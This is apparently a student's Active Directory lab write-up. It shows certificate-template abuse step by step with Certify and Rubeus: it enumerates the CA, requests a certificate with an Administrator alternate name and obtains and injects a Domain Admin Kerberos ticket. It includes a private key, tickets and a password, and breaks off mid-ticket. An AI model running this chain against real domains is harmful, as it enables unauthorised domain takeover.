# Hands-On 17:

## Index Of content:

  1.[]()
  2.[]()
  
## Cerity:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\Certify.exe cas

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=techcorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : TECHCORP-DC-CA
    DNS Hostname                  : Techcorp-DC.techcorp.local
    FullName                      : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
      Allow  ManageCA, ManageCertificates               TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        ForAdminsofPrivilegedAccessWorkstations
        Users
        WDAC
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator





Certify completed in 00:00:18.7932429

```

vulnerable template:

```
C:\Windows\system32>C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=techcorp,DC=local'

[*] Listing info about the Enterprise CA 'TECHCORP-DC-CA'

    Enterprise CA Name            : TECHCORP-DC-CA
    DNS Hostname                  : Techcorp-DC.techcorp.local
    FullName                      : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
      Allow  ManageCA, ManageCertificates               TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
    Enrollment Agent Restrictions : None
Enabled certificate templates where users can supply a SAN:
    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
      Object Control Permissions
        Owner                       : TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteOwner Principals       : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
      Object Control Permissions
        Owner                       : TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteOwner Principals       : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : WDAC
    Schema Version                        : 4
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Code Signing
    mspki-certificate-application-policy  : Code Signing
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
      Object Control Permissions
        Owner                       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
        WriteOwner Principals       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : ForAdminsofPrivilegedAccessWorkstations
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
                                      US\pawadmin                   S-1-5-21-210670787-2521448726-163245708-1138
      Object Control Permissions
        Owner                       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
        WriteOwner Principals       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519



Certify completed in 00:00:10.0676431
```

pswadminn could use template:

```
CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : ForAdminsofPrivilegedAccessWorkstations
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
                                      US\pawadmin                   S-1-5-21-210670787-2521448726-163245708-1138
```

Request Ticket:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'us.techcorp.local\pawadmin'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/us.techcorp.local
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  pawadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/22/2023 10:55:03 AM
  EndTime                  :  2/22/2023 8:55:03 PM
  RenewTill                :  3/1/2023 10:55:03 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  EwLjopa/+morcYvEnssGiQ==
  ASREP (key)              :  0A221DBB52857307249695D6CEC2AF66


```
Copy certificate:

```
C:\Windows\system32>C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : US\studentuser17
[*] No subject name specified, using current context as subject.

[*] Template                : ForAdminsofPrivilegedAccessWorkstations
[*] Subject                 : CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : Techcorp-DC.techcorp.local\TECHCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 31

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxutCsDqyJJbHCN62RfYJuySY8z/lOeWKMbBEnQkHui0LKnv5
QtJ7ntN75i5BDuQlaQ/G02VQGtgwjsJgf8qaZVO4fPFBbUIJA2/2d+RCZFPXMWMY
P7Em4GUGNOX83XF/6o5CJiTybcLLyq6XxS5FN93Q4YETzXsSdoByuR4SMC7GS/Ab
efPxef0rFlQMTuyCqk11O9CiHbFTZe6kfDRMPn1D8tZkvDtzq/JzyGhtIwbK/hKx
BPREmwbZ+brbIBZUFvyLj5hqvgXW4bIzXMcoUxLAKBjhA7xFr7IxJnqwClI/wAgF
j6LvCuMFCbm1DNZ3aykLZ75ZGlvHKgQYgkGGaQIDAQABAoIBAH6M4ap4TSlV+147
Qj8UHnC/AcePmOfSjq6584zsV8wsJ/RpVtUaT6dl6GcyehVdNCe478dBp0rMy2en
ZfknDj70mmRyoCtAXbegHW98+ngVlsxGvQCYVaFg5Cf3QX4oXTb+NjtKOil2Smyx
0sCRhVvbdK5ijhSl/cMCSPpYlT2tBEWxRjdMBw1K8vkz3Wz4wNmuWNd3h+tW0nIt
gqrwP0zsj3Hn0HLbhTSZEEw4cUh9ZSbUSEVQrvbZnkz599ZD8yfA3Q7NZfjWWVn6
tZeVtbWohuVJHfzWx1lzpgiq8BTA8SSTyfnvYc3Pf3Zj9s4EFreUzCWWjyl4xwCO
4Sw9LNkCgYEA9PSC1/XAIoYX2V/BFnB7ZnlE7bQBNrQg1TSjbucSQPSTJdvA0t6T
uYtNReHErydcw4TwX0/YFQl+Z7E6g1FbGvYST1x1MMRT4YubD9NQRXKRx22ypvna
vljCFa1JkgC9EQYXPK1whQlJ4pGpf0kPthY/RbLrP1BRbb04ItF2hM8CgYEAz+Nc
DD2qNaEnTDX5LMFQDbkcwFOOiT9N+Ur4rtHW463AVsJelYuy81bMUn/jhvaTfEQv
uNyI/ybKybNSqzxt7KnGXEbq9HtR/Uqrbx5DyAyWXB+GS0rM4oqUy/u/C1loi6n1
aSzmV2g2s/ytjtGr+vzxUFg0drxl1P1n9BmAf0cCgYAwH1URLjNX1PYce0ZIrUJg
6FQVSrauU4bbu+KbqAObBTFfT6O7CYUF/4rnvqnQKzB7LMO4RcxSnbHalyPCppn6
WvtP4f8X3IoKFk4ZNs9fRVnETxW43f8ORAulDI0WhNSf4o1wGzauvBtqymj9G5Jd
mFNH0xWKM7I7l9/OX04kWwKBgQDKBEEAzDPJZc9Qaeq4KSroCwj7hLcwfEoDhW1g
RR4zpjcQmFVdsaG2gpSPXyP1lUwBKCnP1M90U3ggxZgCOvj/UIQoS+oqpmQoZhVu
J9TqZAEBiMjyBcBQLScnin4+QyYrAoAvMqisK+NsyJDIBsy/XGoMD4r8D1xNu+r2
9IlAJQKBgDZDojCANv9X2FNWng+xVH3OpPgb8i/ZjS0CcWwOXCotQFnpyBqYUc/G
83sI3aGCuLGdRhS3a3cVG84qZlw0H2f1/pPwtjkRTew0VnQkwESXwGMeATavvFqc
WOZia5h1ZU6Ahg+3EU3iUdRri+ZuNKWUYnHUjnSUeoP40b8KGpyZ
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGSDCCBTCgAwIBAgITdwAAAB+fr/pbNwgGNAAAAAAAHzANBgkqhkiG9w0BAQsF
ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJk/IsZAEZFgh0ZWNo
Y29ycDEXMBUGA1UEAxMOVEVDSENPUlAtREMtQ0EwHhcNMjMwMjIyMTg0NzAyWhcN
MjQwMjIyMTg0NzAyWjBtMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJ
k/IsZAEZFgh0ZWNoY29ycDESMBAGCgmSJomT8ixkARkWAnVzMQ4wDAYDVQQDEwVV
c2VyczEWMBQGA1UEAxMNc3R1ZGVudHVzZXIxNzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAMbrQrA6siSWxwjetkX2CbskmPM/5TnlijGwRJ0JB7otCyp7
+ULSe57Te+YuQQ7kJWkPxtNlUBrYMI7CYH/KmmVTuHzxQW1CCQNv9nfkQmRT1zFj
GD+xJuBlBjTl/N1xf+qOQiYk8m3Cy8qul8UuRTfd0OGBE817EnaAcrkeEjAuxkvw
G3nz8Xn9KxZUDE7sgqpNdTvQoh2xU2XupHw0TD59Q/LWZLw7c6vyc8hobSMGyv4S
sQT0RJsG2fm62yAWVBb8i4+Yar4F1uGyM1zHKFMSwCgY4QO8Ra+yMSZ6sApSP8AI
BY+i7wrjBQm5tQzWd2spC2e+WRpbxyoEGIJBhmkCAwEAAaOCAwIwggL+MD4GCSsG
AQQBgjcVBwQxMC8GJysGAQQBgjcVCIW5wzuGgYcDg5WPEIKezyOD0cIbgQCE3O12
ho3hJQIBZAIBCzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwQGCisGAQQB
gjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUH
AwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4G
CCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcN
AwcwHQYDVR0OBBYEFL/l7ilgfrYBIeJ0IaeZZkeQ3PdkMCgGA1UdEQQhMB+gHQYK
KwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFM4YvtTaG9ov
MSEIc+2cFhORAO+RMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NO
PVRFQ0hDT1JQLURDLUNBLENOPVRlY2hjb3JwLURDLENOPUNEUCxDTj1QdWJsaWMl
MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
PXRlY2hjb3JwLERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEE
gbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1URUNIQ09SUC1EQy1DQSxD
Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
Q29uZmlndXJhdGlvbixEQz10ZWNoY29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRl
P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG
9w0BAQsFAAOCAQEAjGAYyoDElXai7mS8vHIO85Yu3AAkP941LeC8TvX6Nk5RAI2p
S6M6YMnI1Y280cVfRzI+wryy8HZfzbh1iSTkSfsa9MfrbnxvylY2y5DoH47t/L/a
VigSttYgx/xqRu85JE4+qpq9wspDmIsYgGwOq8HxLGLYQKx6X7bvENc3l5z0+N/F
gYTRfBaqyizY7fnyhQREXR9w+GfWJcCo10qT9VgWsCp9k0QKzsyIFOOyDGzbxnmA
4sJeFl6Piq1TPtlso305D9LYvSbxEOqwv7apI+fdX68F3I4WMBrKgWIa2QwOroah
iv/4Ra5WLy5XeyEHNHs1CbDCnmXqGKi4ll1Ngw==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:18.0310140
```

Use DA and ingect TGT:

```
C:\Windows\system32>
openssl.exe pkcs12 -in C:\AD\certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\DA.pfx
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:

C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\DA.pfx /password:SecretPass@123 /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'us.techcorp.local\Administrator'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGgjCCBn6gAwIBBaEDAgEWooIFgzCCBX9hggV7MIIFd6ADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBTEwggUtoAMCARKhAwIBAqKCBR8EggUbM+ejgPfMA4p22w2ddObZa9MvxmxaBRM/lIFsgkI9vNEeAIHLIFyaYhIkH0jpz+9+H1y9O/dUN6XmhoWEyryEXIY47vZfS03CDpqkiOjkEeHs2OQi/DVWshWQuho7gmenUkxwbsBRDuwAR5V0KaoZgmb1uaPH/0vqSaY7hG2T/7dQptP3bhwM7Ngs7w7innOKw90peyfNw0s7bQSbiJo/nPcEFm18QwjTEWv8ooaxgtRFJXwa0raL3xcmZsBVoEYNU0LxZiJjz9qXAUdAr6K5XUteZOSHP/jc6IVnoG5og2Li/K3+LOTeNc2E3kEiIuWKzB7+D1eHy0EzP2V1PYXrI5HOhuQ5/IElT0QEm3gDQVsmNw4+lC5IR5JMdneSbtXh5aFz2tdJjKd9YDJRheESyEqfDJPhl2Q27F2Hgze6a+OiXPAjvyga2jGVGcTD4eLCL6VU+VknNuD0WljLiaWjfBI9UEtACpV4MjhkFlDZrAnCiEO+95FOy5vPcg8avqe4+NM7XiZm/aOaMtcBLBRItrp1Br7yGk6DI7C8dpNJFsmkp4gWZEAUJqzBK4FQnXz8HFSH3vkpJ+3pYDokwAhtC+eh2yIMQNb4IrPCnL811GoqnpRVdUhx1+lpy609g8L/OWMqlSVN9EL3WgG0zBhkEoxPUzZlXvo7QbnngRSkFgbD8GoJwBGXvs535aGw4VPDtoBn4RVu4yrgCddGYG/ywcRvTCBTb32E8cl55eBhrI8pGlUodzw57K9z3oM37mI7BEbP5O3WU3WVZraMcwH8/CwtUukGqJ7I69U0DeLAficusn3DOWz4tLWe3WasJGc6f6cqUGo0KPB5B7XvATr/KMIR3qAUaZepUe2tF9wyAV2Mwm34ppxbVFoOLPRAlmc8EXJWriRnj6NDugVNZ/P94W8/QQWSZXHpwHs0JOmkQytsgSMO+1ltKruigliHvz9vd4ta+AmFB2qG89SCRP3vOtOC+GbPbmyqgFnhG7zrnvaH8ItP8dSUZmvJgUaiP1tYEnNI1nkHpYUQ3024pErHmnLJ99kMGfl9h83faQC9kL84X/wofUuAb+y8CVrMX8YYta3PZ3we/rxi1pDYRGFgoyJxUNTj3aSBOQWydMFzwweT+5vXTvvMpOlGyjXFTu7sQyurlZbIZsUgI0QkkPYfFXQA+cRtvE2FC8xhp0vC47hRNYNvmxUNSzbPHTz9a0G4OxgPy8fEUBbBK0ZBQO/CZVTLD5MBNDEH+jsjJGs0dehD1nypgVBvTqvT1IX6J+eawNY/dqggPvccTqoGSOPb5Xce/Gs3r+rVs4xBxdBYTer9oH1Ojmx0g9M6fZh/CpX/zr9CALGFY0SB9Omgy5L8bXn2Pn9JA4FEeScZndsdL10tUkx05yPmfiyOmVQqgX6A3CnGNUl0